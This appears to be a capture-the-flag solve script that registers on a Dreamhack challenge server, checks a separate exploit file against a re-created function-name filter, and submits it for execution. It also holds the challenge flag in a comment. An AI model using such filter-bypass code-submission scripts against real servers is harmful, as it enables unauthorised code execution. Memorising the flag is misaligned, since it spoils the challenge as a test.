import requests
import re
#TARGET_URL = 'http://0.0.0.0:2222'
TARGET_URL = 'http://host1.dreamhack.games:14538'
#DH{answpqhekvmfformwjdgksmsrpdjfudnj^.^}
no_func_filter =lambda x:re.findall(r'\(*([^)]+)\)',x)
def no_func(st):
    if 'system' in st:
        return False
    li = no_func_filter(st)
    for t in li:
        t = t.split('(')[0]
        t = t.replace(';','').replace(' ','\n').split('\n')[-1]
        print(t)
        print(len(t))
        if len(t) > 5:
            return False
    return True

def register(uid,pw):
    data = {
        "uid":uid,
        "pw":pw
    }

    res = requests.post(f"{TARGET_URL}/reg",data=data)

    return res.text

def login(uid,pw):
    data = {
        "uid":uid,
        "pw":pw
    }

    s = requests.Session()
    res = s.post(f"{TARGET_URL}/login",data=data)

    #print(res.text)

    return s

def getFunc(file):
    with open(file,'r') as f:
        data = f.read()
        return data

def code(s,code):
    data = {
        "code":code
    }
    res = s.post(f"{TARGET_URL}/prob",data=data)

    return res.text

print(register('navyhk356','navyhk'))
s=login('navyhk356','navyhk')
res = no_func(getFunc('exploit.c'))

if res:
    print('yay')
    print(code(s,getFunc('exploit.c')))